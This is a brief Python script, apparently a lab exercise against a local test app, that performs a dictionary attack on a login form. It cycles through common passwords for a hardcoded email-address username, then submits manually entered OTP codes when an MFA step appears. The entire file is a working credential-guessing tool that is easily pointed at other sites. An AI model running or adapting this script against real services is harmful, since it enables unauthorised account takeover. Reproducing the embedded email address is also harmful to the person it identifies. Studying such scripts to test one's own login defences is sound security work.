import requests

url = 'http://127.0.0.1:5000/'
mfa_url = 'http://127.0.0.1:5000/mfa'
username = 'ofirpeleg2111@gmail.com'
common_passwords = [
    'password',
    'password123',
    'Aa123456',
    'qwerty',
    'mypassword',
    'soccer',
    '000000',
    'user',
    '1234'
]

session = requests.Session()

# Attempt to login with common passwords (dictionary attack)
for password in common_passwords:
    response = session.post(url, data={'username': username, 'password': password})
    print(f'Attempt with password: {password}, Response URL: {response.url}')
    if response.status_code == 200:
        # For demonstration purposes only
        if 'mfa' in response.url:
            print(f'MFA required for Username: {username}, Password: {password}')
            while True:
                otp = input("Enter the OTP code: ")
                mfa_response = session.post(mfa_url, data={'token': otp})
                print(f'Trying OTP: {otp}, Response Status Code: {mfa_response.status_code}')
                if mfa_response.status_code == 200:
                    print(f'Success! Username: {username}, Password: {password}, OTP: {otp}')
                    break
                else:
                    print("Invalid OTP. Please try again.")
            break
        else:
            print(f'Success! Username: {username}, Password: {password}')
            break
    else:
        print(f'Failed login attempt with password: {password}')
